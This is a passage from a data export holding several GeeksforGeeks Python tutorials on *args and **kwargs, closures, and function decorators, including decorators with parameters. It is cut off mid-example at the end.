    "text": "In Python, we can pass a variable number of arguments to a function using special symbols. There are two special symbols:Special Symbols Used for passing arguments:-1.)*args (Non-Keyword Arguments)2.)**kwargs (Keyword Arguments)Note: \u201cWe use the \u201cwildcard\u201d or \u201c*\u201d notation like this \u2013 *args OR **kwargs \u2013 as our function\u2019s argument when we have doubts about the number of \u00a0arguments we should pass in a function.\u201d\u00a01.) *argsThe special syntax *args in function definitions in python is used to pass a variable number of arguments to a function. It is used to pass a non-key worded, variable-length argument list.\u00a0The syntax is to use the symbol * to take in a variable number of arguments; by convention, it is often used with the word args.What *args allows you to do is take in more arguments than the number of formal arguments that you previously defined. With *args, any number of extra arguments can be tacked on to your current formal parameters (including zero extra arguments).For example : we want to make a multiply function that takes any number of arguments and able to multiply them all together. It can be done using *args.Using the *, the variable that we associate with the * becomes an iterable meaning you can do things like iterate over it, run some higher-order functions such as map and filter, etc.\u00a0python3# Python program to illustrate\u00a0# *args for variable number of argumentsdef myFun(*argv):\u00a0\u00a0\u00a0\u00a0for arg in argv:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (arg)\u00a0\u00a0\u00a0myFun('Hello', 'Welcome', 'to', 'GeeksforGeeks')Output:\u00a0Hello\nWelcome\nto\nGeeksforGeeks\u00a0Python3# Python program to illustrate# *args with first extra argumentdef myFun(arg1, *argv):\u00a0\u00a0\u00a0\u00a0print (\"First argument :\", arg1)\u00a0\u00a0\u00a0\u00a0for arg in argv:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Next argument through *argv :\", arg)\u00a0myFun('Hello', 'Welcome', 'to', 'GeeksforGeeks')Output:\u00a0First argument : Hello\nNext argument through *argv : Welcome\nNext argument through *argv : to\nNext argument through *argv : GeeksforGeeks\u00a0\u00a02.)**kwargsThe special syntax **kwargs in function definitions in python is used to pass a keyworded, variable-length argument list. We use the name kwargs with the double star. The reason is because the double star allows us to pass through keyword arguments (and any number of them).A keyword argument is where you provide a name to the variable as you pass it into the function.One can think of the kwargs as being a dictionary that maps each keyword to the value that we pass alongside it. That is why when we iterate over the kwargs there doesn\u2019t seem to be any order in which they were printed out.Example for usage of **kwargs:\u00a0python# Python program to illustrate\u00a0# *kwargs for variable number of keyword arguments\u00a0def myFun(**kwargs):\u00a0\u00a0\u00a0\u00a0for key, value in kwargs.items():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"%s == %s\" %(key, value))\u00a0# Driver codemyFun(first ='Geeks', mid ='for', last='Geeks')\u00a0\u00a0\u00a0Output:\u00a0last == Geeks\nmid == for\nfirst == Geeks\u00a0python# Python program to illustrate\u00a0 **kwargs for# variable number of keyword arguments with# one extra argument.\u00a0def myFun(arg1, **kwargs):\u00a0\u00a0\u00a0\u00a0for key, value in kwargs.items():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"%s == %s\" %(key, value))\u00a0# Driver codemyFun(\"Hi\", first ='Geeks', mid ='for', last='Geeks')\u00a0\u00a0\u00a0Output:\u00a0last == Geeks\nmid == for\nfirst == Geeks\u00a0Using *args and **kwargs to call a functionExample:\u00a0python3def myFun(arg1, arg2, arg3):\u00a0\u00a0\u00a0\u00a0print(\"arg1:\", arg1)\u00a0\u00a0\u00a0\u00a0print(\"arg2:\", arg2)\u00a0\u00a0\u00a0\u00a0print(\"arg3:\", arg3)\u00a0\u00a0\u00a0\u00a0\u00a0# Now we can use *args or **kwargs to# pass arguments to this function :args = (\"Geeks\", \"for\", \"Geeks\")myFun(*args)\u00a0kwargs = {\"arg1\" : \"Geeks\", \"arg2\" : \"for\", \"arg3\" : \"Geeks\"}myFun(**kwargs)Output:\u00a0arg1: Geeks\narg2: for\narg3: Geeks\narg1: Geeks\narg2: for\narg3: Geeks\u00a0Using *args and **kwargs in same line to call a functionExample:\u00a0python3def myFun(*args,**kwargs):\u00a0\u00a0\u00a0\u00a0print(\"args: \", args)\u00a0\u00a0\u00a0\u00a0print(\"kwargs: \", kwargs)\u00a0\u00a0# Now we can use both *args ,**kwargs# to pass arguments to this function :myFun('geeks','for','geeks',first=\"Geeks\",mid=\"for\",last=\"Geeks\")Output:\u00a0args: ('geeks', 'for', 'geeks')\nkwargs {'first': 'Geeks', 'mid': 'for', 'last': 'Geeks'}\u00a0This article is contributed by Kishlay Verma. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1e4c74c5a57facd3381eb4b7cab5487f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Before seeing what a closure is, we have to first understand what nested functions and non-local variables are.\u00a0\u00a0Nested functions in PythonA function that is defined inside another function is known as a nested function. Nested functions are able to access variables of the enclosing scope.\u00a0In Python, these non-local variables can be accessed only within their scope and not outside their scope. This can be illustrated by the following example:\u00a0Python3# Python program to illustrate# nested functionsdef outerFunction(text):\u00a0\u00a0\u00a0\u00a0text = text\u00a0\u00a0\u00a0\u00a0\u00a0def innerFunction():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(text)\u00a0\u00a0\u00a0\u00a0\u00a0innerFunction()\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0outerFunction('Hey!')As we can see innerFunction() can easily be accessed inside the outerFunction body but not outside of it\u2019s body. Hence, here, innerFunction() is treated as nested Function which uses text as non-local variable.\u00a0Python ClosuresA Closure is a function object that remembers values in enclosing scopes even if they are not present in memory.\u00a0\u00a0It is a record that stores a function together with an environment: a mapping associating each free variable of the function (variables that are used locally but defined in an enclosing scope) with the value or reference to which the name was bound when the closure was created.A closure\u2014unlike a plain function\u2014allows the function to access those captured variables through the closure\u2019s copies of their values or references, even when the function is invoked outside their scope.Python3# Python program to illustrate# closuresdef outerFunction(text):\u00a0\u00a0\u00a0\u00a0text = text\u00a0\u00a0\u00a0\u00a0\u00a0def innerFunction():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(text)\u00a0\u00a0\u00a0\u00a0\u00a0# Note we are returning function\u00a0\u00a0\u00a0\u00a0# WITHOUT parenthesis\u00a0\u00a0\u00a0\u00a0return innerFunction\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0myFunction = outerFunction('Hey!')\u00a0\u00a0\u00a0\u00a0myFunction()Output:\nomkarpathak@omkarpathak-Inspiron-3542:\n~/Documents/Python-Programs/$ python Closures.py \nHey!As observed from the above code, closures help to invoke functions outside their scope.The function innerFunction has its scope only inside the outerFunction. But with the use of closures, we can easily extend its scope to invoke a function outside its scope.Python3# Python program to illustrate# closuresimport logginglogging.basicConfig(filename='example.log',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0level=logging.INFO)\u00a0\u00a0def logger(func):\u00a0\u00a0\u00a0\u00a0def log_func(*args):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0logging.info(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Running \"{}\" with arguments {}'.format(func.__name__,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0args))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(func(*args))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Necessary for closure to\u00a0\u00a0\u00a0\u00a0# work (returning WITHOUT parenthesis)\u00a0\u00a0\u00a0\u00a0return log_func\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def add(x, y):\u00a0\u00a0\u00a0\u00a0return x+y\u00a0def sub(x, y):\u00a0\u00a0\u00a0\u00a0return x-y\u00a0add_logger = logger(add)sub_logger = logger(sub)\u00a0add_logger(3, 3)add_logger(4, 5)\u00a0sub_logger(10, 5)sub_logger(20, 10)OUTPUT:\nomkarpathak@omkarpathak-Inspiron-3542:\n~/Documents/Python-Programs/$ python MoreOnClosures.py \n6\n9\n5\n10When and why to use Closures:1. As closures are used as callback functions, they provide some sort of data hiding. This helps us to reduce the use of global variables.2. \u00a0When we have few functions in our code, closures prove to be an efficient way. But if we need to have many functions, then go for class (OOP).This article is contributed by Omkar Pathak. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "46ba8bfda1fb562cd2915362b2f0125b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "BackgroundFollowing are important facts about functions in Python that are useful to understand decorator functions.In Python, we can define a function inside another function.In Python, a function can be passed as parameter to another function (a function can also return another function).# A Python program to demonstrate that a function# can be defined inside another function and a# function can be passed as parameter.\u00a0\u00a0# Adds a welcome message to the stringdef messageWithWelcome(str):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Nested function\u00a0\u00a0\u00a0\u00a0def addWelcome():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Welcome to \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Return concatenation of addWelcome()\u00a0\u00a0\u00a0\u00a0# and str.\u00a0\u00a0\u00a0\u00a0return\u00a0 addWelcome() + str\u00a0\u00a0# To get site name to which welcome is addeddef site(site_name):\u00a0\u00a0\u00a0\u00a0return site_name\u00a0\u00a0print messageWithWelcome(site(\"GeeksforGeeks\"))Output:Welcome to GeeksforGeeksFunction DecoratorA decorator is a function that takes a function as its only parameter and returns a function. This is helpful to \u201cwrap\u201d functionality with the same code over and over again. For example, above code can be re-written as following.We use @func_name to specify a decorator to be applied on another function.# Adds a welcome message to the string# returned by fun(). Takes fun() as# parameter and returns welcome().def decorate_message(fun):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Nested function\u00a0\u00a0\u00a0\u00a0def addWelcome(site_name):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Welcome to \" + fun(site_name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Decorator returns a function\u00a0\u00a0\u00a0\u00a0return addWelcome\u00a0\u00a0@decorate_messagedef site(site_name):\u00a0\u00a0\u00a0\u00a0return site_name;\u00a0\u00a0# Driver code\u00a0\u00a0# This call is equivalent to call to# decorate_message() with function# site(\"GeeksforGeeks\") as parameterprint site(\"GeeksforGeeks\")Output:Welcome to GeeksforGeeksDecorators can also be useful to attach data (or add attribute) to functions.# A Python example to demonstrate that# decorators can be useful attach data\u00a0\u00a0# A decorator function to attach# data to funcdef attach_data(func):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func.data = 3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return func\u00a0\u00a0@attach_datadef add (x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x + y\u00a0\u00a0# Driver code\u00a0\u00a0# This call is equivalent to attach_data()# with add() as parameterprint(add(2, 3))\u00a0\u00a0print(add.data)Output:5\r\n3\u2018add()\u2019 returns sum of x and y passed as arguments but it is wrapped by a decorator function, calling add(2, 3) would simply give sum of two numbers but when we call add.data then \u2018add\u2019 function is passed into then decorator function \u2018attach_data\u2019 as argument and this function returns \u2018add\u2019 function with an attribute \u2018data\u2019 that is set to 3 and hence prints it.Python decorators are a powerful tool to remove redundancy.Please refer Decorators in Python for more details.This article is contributed by Shwetanshu Rohatgi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "2815c156fc544c78cc2714f154ea1ef1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Decorators are a very powerful and useful tool in Python since it allows programmers to modify the behaviour of function or class. Decorators allow us to wrap another function in order to extend the behaviour of the wrapped function, without permanently modifying it. But before diving deep into decorators let us understand some concepts that will come in handy in learning the decorators.First Class ObjectsIn Python, functions are first class objects that mean that functions in Python can be used or passed as arguments.Properties of first class functions:A function is an instance of the Object type.You can store the function in a variable.You can pass the function as a parameter to another function.You can return the function from a function.You can store them in data structures such as hash tables, lists, \u2026Consider the below examples for better understanding.Example 1: Treating the functions as objects.\u00a0Python3# Python program to illustrate functions# can be treated as objectsdef shout(text):\u00a0\u00a0\u00a0\u00a0return text.upper()\u00a0print(shout('Hello'))\u00a0yell = shout\u00a0print(yell('Hello'))Output:HELLO\nHELLOIn the above example, we have assigned the function shout to a variable. This will not call the function instead it takes the function object referenced by a shout and creates a second name pointing to it, yell.Example 2: Passing the function as an argument\u00a0Python3# Python program to illustrate functions# can be passed as arguments to other functionsdef shout(text):\u00a0\u00a0\u00a0\u00a0return text.upper()\u00a0def whisper(text):\u00a0\u00a0\u00a0\u00a0return text.lower()\u00a0def greet(func):\u00a0\u00a0\u00a0\u00a0# storing the function in a variable\u00a0\u00a0\u00a0\u00a0greeting = func(\"\"\"Hi, I am created by a function passed as an argument.\"\"\")\u00a0\u00a0\u00a0\u00a0print (greeting)\u00a0greet(shout)greet(whisper)Output:HI, I AM CREATED BY A FUNCTION PASSED AS AN ARGUMENT.\nhi, i am created by a function passed as an argument.In the above example, the greet function takes another function as a parameter (shout and whisper in this case). The function passed as an argument is then called inside the function greet.Example 3: Returning functions from another function.Python3# Python program to illustrate functions# Functions can return another function\u00a0def create_adder(x):\u00a0\u00a0\u00a0\u00a0def adder(y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x+y\u00a0\u00a0\u00a0\u00a0\u00a0return adder\u00a0add_15 = create_adder(15)\u00a0print(add_15(10))Output:25In the above example, we have created a function inside of another function and then have returned the function created inside.The above three examples depict the important concepts that are needed to understand decorators. After going through them let us now dive deep into decorators.DecoratorsAs stated above the decorators are used to modify the behaviour of function or class. In Decorators, functions are taken as the argument into another function and then called inside the wrapper function.Syntax for Decorator:\u00a0@gfg_decorator\ndef hello_decorator():\n    print(\"Gfg\")\n\n'''Above code is equivalent to -\n\ndef hello_decorator():\n    print(\"Gfg\")\n    \nhello_decorator = gfg_decorator(hello_decorator)'''In the above code, gfg_decorator is a callable function, will add some code on the top of some another callable function, hello_decorator function and return the wrapper function.Decorator can modify the behaviour:\u00a0\u00a0Python3# defining a decoratordef hello_decorator(func):\u00a0\u00a0\u00a0\u00a0\u00a0# inner1 is a Wrapper function in\u00a0\u00a0\u00a0\u00a0# which the argument is called\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner function can access the outer local\u00a0\u00a0\u00a0\u00a0# functions like in this case \"func\"\u00a0\u00a0\u00a0\u00a0def inner1():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Hello, this is before function execution\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# calling the actual function now\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inside the wrapper function.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"This is after function execution\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return inner1\u00a0\u00a0# defining a function, to be called inside wrapperdef function_to_be_used():\u00a0\u00a0\u00a0\u00a0print(\"This is inside the function !!\")\u00a0\u00a0# passing 'function_to_be_used' inside the# decorator to control its behaviourfunction_to_be_used = hello_decorator(function_to_be_used)\u00a0\u00a0# calling the functionfunction_to_be_used()Output:\u00a0Hello, this is before function execution\nThis is inside the function !!\nThis is after function executionLet\u2019s see the behaviour of the above code how it runs step by step when the \u201cfunction_to_be_used\u201d is called.Let\u2019s jump to another example where we can easily find out the execution time of a function using a decorator.Python3# importing librariesimport timeimport math\u00a0# decorator to calculate duration# taken by any function.def calculate_time(func):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# added arguments inside the inner1,\u00a0\u00a0\u00a0\u00a0# if function takes any arguments,\u00a0\u00a0\u00a0\u00a0# can be added like this.\u00a0\u00a0\u00a0\u00a0def inner1(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# storing time before function execution\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0begin = time.time()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func(*args, **kwargs)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# storing time after function execution\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0end = time.time()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Total time taken in : \", func.__name__, end - begin)\u00a0\u00a0\u00a0\u00a0\u00a0return inner1\u00a0\u00a0\u00a0# this can be added to any function present,# in this case to calculate a factorial@calculate_timedef factorial(num):\u00a0\u00a0\u00a0\u00a0\u00a0# sleep 2 seconds because it takes very less time\u00a0\u00a0\u00a0\u00a0# so that you can see the actual difference\u00a0\u00a0\u00a0\u00a0time.sleep(2)\u00a0\u00a0\u00a0\u00a0print(math.factorial(num))\u00a0# calling the function.factorial(10)Output:\u00a03628800\nTotal time taken in :  factorial 2.0061802864074707What if a function returns something or an argument is passed to the function?In all the above examples the functions didn\u2019t return anything so there wasn\u2019t any issue, but one may need the returned value.Python3def hello_decorator(func):\u00a0\u00a0\u00a0\u00a0def inner1(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"before Execution\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# getting the returned value\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0returned_value = func(*args, **kwargs)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"after Execution\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# returning the value to the original frame\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return returned_value\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return inner1\u00a0\u00a0# adding decorator to the function@hello_decoratordef sum_two_numbers(a, b):\u00a0\u00a0\u00a0\u00a0print(\"Inside the function\")\u00a0\u00a0\u00a0\u00a0return a + b\u00a0a, b = 1, 2\u00a0# getting the value through return of the functionprint(\"Sum =\", sum_two_numbers(a, b))Output:\u00a0before Execution\nInside the function\nafter Execution\nSum = 3In the above example, you may notice a keen difference in the parameters of the inner function. The inner function takes the argument as *args and **kwargs which means that a tuple of positional arguments or a dictionary of keyword arguments can be passed of any length. This makes it a general decorator that can decorate a function having any number of arguments.Chaining DecoratorsIn simpler terms chaining decorators means decorating a function with multiple decorators.Example:\u00a0Python3# code for testing decorator chainingdef decor1(func):\u00a0\u00a0\u00a0\u00a0def inner():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x = func()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x * x\u00a0\u00a0\u00a0\u00a0return inner\u00a0def decor(func):\u00a0\u00a0\u00a0\u00a0def inner():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x = func()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 2 * x\u00a0\u00a0\u00a0\u00a0return inner\u00a0@decor1@decordef num():\u00a0\u00a0\u00a0\u00a0return 10\u00a0print(num())Output:400The above example is similar to calling the function as \u2013decor1(decor(num))\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3fd9f68d1eea34aeea3c8c1d3b0e1efa",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite: Decorators in Python, Function DecoratorsWe know Decorators are a very powerful and useful tool in Python since it allows programmers to modify the behavior of function or class. In this article, we will learn about the Decorators with Parameters with help of multiple examples.\u00a0Python functions are First Class citizens which means that functions can be treated similarly to objects.\u00a0\u00a0Function can be assigned to a variable i.e they can be referenced.Function can be passed as an argument to another function.Function can be returned from a function.Decorators with parameters is similar to normal decorators.\u00a0The syntax for decorators with parameters :@decorator(params)\ndef func_name():\n    ''' Function implementation'''The above code is equivalent to\u00a0def func_name():\n    ''' Function implementation'''\n\nfunc_name = (decorator(params))(func_name)\n\"\"\"As the execution starts from left to right decorator(params) is called which returns a function object fun_obj. Using the fun_obj the call fun_obj(fun_name) is made. Inside the inner function, required operations are performed and the actual function reference is returned which will be assigned to func_name. Now, func_name() can be used to call the function with decorator applied on it.\u00a0How Decorator with parameters is implemented\u00a0Python3def decorators(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0def inner(func):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0do operations with func\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return func\u00a0\u00a0\u00a0\u00a0return inner #this is the fun_obj mentioned in the above content\u00a0@decorators(params)def func():\u00a0\u00a0\u00a0\u00a0\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0function implementation\u00a0\u00a0\u00a0\u00a0\"\"\"Here params can also be empty.\u00a0Observe these first :Python3# Python code to illustrate# Decorators basic in Python\u00a0def decorator_fun(func):\u00a0\u00a0print(\"Inside decorator\")\u00a0\u00a0\u00a0def inner(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0print(\"Inside inner function\")\u00a0\u00a0\u00a0\u00a0print(\"Decorated the function\")\u00a0\u00a0\u00a0\u00a0# do operations with func\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return inner\u00a0@decorator_fundef func_to():\u00a0\u00a0\u00a0\u00a0print(\"Inside actual function\")\u00a0func_to()Another Way:\u00a0Python3# Python code to illustrate# Decorators with parameters in Python\u00a0def decorator_fun(func):\u00a0\u00a0print(\"Inside decorator\")\u00a0\u00a0\u00a0def inner(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0print(\"Inside inner function\")\u00a0\u00a0\u00a0\u00a0print(\"Decorated the function\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return inner\u00a0\u00a0def func_to():\u00a0\u00a0\u00a0\u00a0print(\"Inside actual function\")\u00a0# another way of using decoratorsdecorator_fun(func_to)()Output:\u00a0Inside decorator\nInside inner function\nDecorated the function\nInside actual function\u00a0\u00a0Let\u2019s move to another example:\u00a0Example #1:\u00a0Python3# Python code to illustrate# Decorators with parameters in Python\u00a0def decorator(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0print(\"Inside decorator\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def inner(func):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# code functionality here\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Inside inner function\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I like\", kwargs['like'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# returning inner function\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return inner\u00a0@decorator(like = \"geeksforgeeks\")def my_func():\u00a0\u00a0\u00a0\u00a0print(\"Inside actual function\")Output:\u00a0\u00a0Inside decorator\nInside inner function\nI like geeksforgeeks\nInside actual functionExample #2:\u00a0\u00a0Python3# Python code to illustrate# Decorators with parameters in Python\u00a0def decorator_func(x, y):\u00a0\u00a0\u00a0\u00a0\u00a0def Inner(func):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def wrapper(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I like Geeksforgeeks\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Summation of values - {}\".format(x+y) )\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0func(*args, **kwargs)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return wrapper\u00a0\u00a0\u00a0\u00a0return Inner\u00a0\u00a0# Not using decoratordef my_fun(*args):\u00a0\u00a0\u00a0\u00a0for ele in args:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(ele)\u00a0# another way of using decoratorsdecorator_func(12, 15)(my_fun)('Geeks', 'for', 'Geeks')Output:\u00a0\u00a0I like Geeksforgeeks\nSummation of values - 27\nGeeks\nfor\nGeeksThis example also tells us that Outer function parameters can be accessed by the enclosed inner function.\u00a0\u00a0Example #3: \u00a0Python3# Python code to illustrate# Decorators with parameters in Python\u00a0 (Multi-level Decorators)\u00a0\u00a0def decodecorator(dataType, message1, message2):\u00a0\u00a0\u00a0\u00a0def decorator(fun):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(message1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def wrapper(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(message2)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if all([type(arg) == dataType for arg in args]):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return fun(*args, **kwargs)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Invalid Input\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return wrapper\u00a0\u00a0\u00a0\u00a0return decorator\u00a0\u00a0@decodecorator(str, \"Decorator for 'stringJoin'\", \"stringJoin started ...\")def stringJoin(*args):\u00a0\u00a0\u00a0\u00a0st = ''\u00a0\u00a0\u00a0\u00a0for i in args:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0st += i\u00a0\u00a0\u00a0\u00a0return st\u00a0\u00a0@decodecorator(int, \"Decorator for 'summation'\\n\", \"summation started ...\")def summation(*args):\u00a0\u00a0\u00a0\u00a0summ = 0\u00a0\u00a0\u00a0\u00a0for arg in 